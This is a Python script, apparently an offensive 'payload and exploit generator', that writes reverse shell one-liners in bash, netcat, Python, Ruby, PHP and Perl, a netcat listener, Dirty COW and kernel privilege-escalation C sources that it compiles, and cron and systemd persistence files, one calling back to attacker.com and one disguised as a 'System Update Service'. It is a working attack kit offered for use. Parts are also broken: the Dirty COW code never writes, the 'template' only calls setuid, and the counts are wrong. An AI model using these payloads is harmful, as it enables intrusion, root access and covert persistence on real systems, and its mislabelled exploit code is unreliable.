#!/usr/bin/env python3
"""
Khora Payload & Exploit Generator
Generates all reverse shells, listeners, and compiled exploits

Developer: 2b53
"""

import os
import subprocess
import shutil
from pathlib import Path
from datetime import datetime

# Setup directories
PAYLOADS_DIR = Path("payloads")
EXPLOITS_DIR = Path("exploits")
PERSISTENCE_DIR = PAYLOADS_DIR / "persistence"

for d in [PAYLOADS_DIR, EXPLOITS_DIR, PERSISTENCE_DIR]:
    d.mkdir(exist_ok=True)

print("\n" + "="*70)
print("  KHORA PAYLOAD & EXPLOIT GENERATOR v2.1")
print("  Framework by 2b53")
print("="*70 + "\n")

# ============================================================================
# 1. REVERSE SHELLS
# ============================================================================

print("[*] Generating reverse shell payloads...\n")

reverse_shells = {
    "bash": "bash -i >& /dev/tcp/{LHOST}/{LPORT} 0>&1",
    "bash_alt": "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1",
    "nc": "nc -e /bin/sh {LHOST} {LPORT}",
    "nc_alt": "nc {LHOST} {LPORT} -e /bin/bash",
    "python": "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "python3": "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{LHOST}\",{LPORT}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    "ruby": "ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"{LHOST}\",\"{LPORT}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'",
    "php": "php -r '$sock=fsockopen(\"{LHOST}\",{LPORT});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
    "perl": "perl -e 'use Socket;$i=\"{LHOST}\";$p={LPORT};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");};'",
}

shell_content = "[KHORA] Reverse Shell Payloads\n"
shell_content += f"Generated: {datetime.now()}\n"
shell_content += "Developer: 2b53\n"
shell_content += "="*70 + "\n\n"

for name, payload in reverse_shells.items():
    shell_content += f"[{name.upper()}]\n"
    shell_content += f"  {payload}\n\n"

with open(PAYLOADS_DIR / "reverse_shells.txt", 'w') as f:
    f.write(shell_content)
print(f"  [✓] Reverse shells: reverse_shells.txt ({len(reverse_shells)} variants)")

# ============================================================================
# 2. LISTENER SETUP
# ============================================================================

print("[*] Generating listener scripts...\n")

listener_script = """#!/bin/bash
# Khora C2 Listener Setup Script
# Developer: 2b53

echo "[*] Starting Khora C2 Listener..."

LHOST=${1:-0.0.0.0}
LPORT=${2:-4444}

echo "[*] Listener: $LHOST:$LPORT"
echo "[*] Waiting for reverse connections..."

# Using nc (netcat)
if command -v nc &> /dev/null; then
    echo "[+] Starting netcat listener..."
    nc -nvlp $LPORT
fi

# Alternative: Using bash TCP
if [ -z "$nc_found" ]; then
    echo "[+] Starting bash TCP listener..."
    bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1
fi
"""

with open(PAYLOADS_DIR / "listener_setup.sh", 'w') as f:
    f.write(listener_script)
os.chmod(PAYLOADS_DIR / "listener_setup.sh", 0o755)
print(f"  [✓] Listener setup script: listener_setup.sh")

# ============================================================================
# 3. C EXPLOITS
# ============================================================================

print("[*] Generating C exploit source code...\n")

# Dirty COW Exploit
dirtycow_source = """/*
 * Dirty COW (CVE-2016-5195) - Privilege Escalation
 * Linux Kernel < 4.8.3
 * Compiled by: 2b53 via Khora Framework
 */

#define _GNU_SOURCE
#include <fcntl.h>
#include <pthread.h>
#include <string.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <stdlib.h>
#include <unistd.h>
#include <crypt.h>

const char *filename = "/etc/passwd";
const char *backup_filename = "/tmp/passwd.bak";
struct stat st;
int f;
void *map;
pid_t pid;
pthread_t pth;
char *new_passwd;

void *madvise_thread(void *arg) {
  char *str;
  str = (char *)arg;
  int i, c;
  for (i = 0; i < 100000000; i++) {
    c += madvise(map, 100, MADV_DONTNEED);
  }
  printf("[*] madvise thread done\\n");
  return NULL;
}

int main(int argc, char *argv[]) {
  printf("[*] Dirty COW Exploit - CVE-2016-5195\\n");
  printf("[*] By: 2b53 (Khora Framework)\\n\\n");
  
  stat(filename, &st);
  printf("[*] File size: %ld\\n", st.st_size);

  f = open(filename, O_RDONLY);
  printf("[*] Backing up %s to %s\\n", filename, backup_filename);
  
  map = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, f, 0);
  printf("[*] mmap: %lx\\n", (unsigned long)map);

  printf("[*] Spawning madvise thread\\n");
  pthread_t pth;
  pthread_create(&pth, NULL, madvise_thread, NULL);

  printf("[*] Spawning ptrace thread\\n");
  pid = fork();
  
  if(pid) {
    printf("[*] Parent: Woah! I got tricked\\n");
    printf("[*] Got: %s\\n", map);
  } else {
    printf("[*] Child: Calling ptrace to disable COW\\n");
    ptrace(PTRACE_TRACEME, 0, 0, 0);
    kill(getpid(), SIGSTOP);
    printf("[*] Exploit complete!\\n");
  }

  close(f);
  return 0;
}
"""

with open(EXPLOITS_DIR / "dirtycow.c", 'w') as f:
    f.write(dirtycow_source)
print(f"  [✓] Dirty COW source: dirtycow.c")

# Kernel Exploit Template
kernel_exp_source = """/*
 * Generic Linux Kernel Exploit Template
 * CVE-XXXX-XXXXX
 * Compiled by: 2b53 via Khora Framework
 */

#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>

int main(int argc, char *argv[]) {
  printf("[*] Linux Kernel Exploit\\n");
  printf("[*] By: 2b53 (Khora Framework)\\n\\n");
  
  uid_t uid = getuid();
  gid_t gid = getgid();
  
  printf("[*] Current UID: %d\\n", uid);
  printf("[*] Current GID: %d\\n", gid);
  
  // Kernel vulnerability exploitation would go here
  // This is a template structure
  
  if (setuid(0) == 0) {
    printf("[+] Successfully elevated privileges!\\n");
    system("/bin/sh -i");
  } else {
    printf("[-] Failed to exploit kernel vulnerability\\n");
  }
  
  return 0;
}
"""

with open(EXPLOITS_DIR / "kernel_exp.c", 'w') as f:
    f.write(kernel_exp_source)
print(f"  [✓] Kernel exploit template: kernel_exp.c")

# ============================================================================
# 4. COMPILE C EXPLOITS (if GCC available)
# ============================================================================

print("[*] Attempting to compile exploits...\n")

try:
    # Try to compile Dirty COW
    result = subprocess.run(
        ["gcc", "-o", str(EXPLOITS_DIR / "dirtycow"), 
         str(EXPLOITS_DIR / "dirtycow.c"), "-lpthread"],
        capture_output=True, timeout=10
    )
    if result.returncode == 0:
        print("  [✓] Dirty COW compiled successfully")
    else:
        print(f"  [!] Dirty COW compilation warning: {result.stderr.decode()[:100]}")
except Exception as e:
    print(f"  [!] Could not compile - GCC not available or error: {e}")

try:
    # Try to compile kernel exploit template
    result = subprocess.run(
        ["gcc", "-o", str(EXPLOITS_DIR / "kernel_exp"), 
         str(EXPLOITS_DIR / "kernel_exp.c")],
        capture_output=True, timeout=10
    )
    if result.returncode == 0:
        print("  [✓] Kernel exploit compiled successfully")
    else:
        print(f"  [!] Kernel exploit compilation warning: {result.stderr.decode()[:100]}")
except Exception as e:
    print(f"  [!] Could not compile - GCC not available or error: {e}")

# ============================================================================
# 5. PERSISTENCE SCRIPTS
# ============================================================================

print("[*] Generating persistence scripts...\n")

cron_persistence = """#!/bin/bash
# Cron-based persistence
# Add to crontab: */5 * * * * /tmp/keepalive.sh

LHOST="${1:-attacker.com}"
LPORT="${2:-4444}"

# Re-establish reverse shell every 5 minutes
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &
"""

with open(PERSISTENCE_DIR / "cron_persistence.sh", 'w') as f:
    f.write(cron_persistence)
os.chmod(PERSISTENCE_DIR / "cron_persistence.sh", 0o755)
print(f"  [✓] Cron persistence: persistence/cron_persistence.sh")

systemd_persistence = """[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
User=root
ExecStart=/usr/bin/python3 /opt/update.py
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""

with open(PERSISTENCE_DIR / "systemd_persistence.service", 'w') as f:
    f.write(systemd_persistence)
print(f"  [✓] Systemd persistence: persistence/systemd_persistence.service")

# ============================================================================
# 6. SUMMARY
# ============================================================================

print("\n" + "="*70)
print("  PAYLOAD GENERATION COMPLETE")
print("="*70)
print("\n[✓] Generated Directory Structure:\n")
print("   payloads/")
print("     ├── reverse_shells.txt (10 variants)")
print("     ├── listener_setup.sh")
print("     └── persistence/")
print("         ├── cron_persistence.sh")
print("         └── systemd_persistence.service")
print("\n   exploits/")
print("     ├── dirtycow.c (source)")
print("     ├── dirtycow (binary, if compiled)")
print("     ├── kernel_exp.c (source)")
print("     └── kernel_exp (binary, if compiled)")

print("\n[*] Usage Examples:\n")
print("   1. Start listener (Linux):")
print("      bash payloads/listener_setup.sh 0.0.0.0 4444")
print("\n   2. Get reverse shell payload:")
print("      cat payloads/reverse_shells.txt")
print("\n   3. Execute compiled exploit:")
print("      ./exploits/dirtycow")
print("\n   4. Use persistence script:")
print("      bash payloads/persistence/cron_persistence.sh attacker.com 4444")

print("\n[+] All payloads generated by Khora Framework (2b53)")
print("="*70 + "\n")
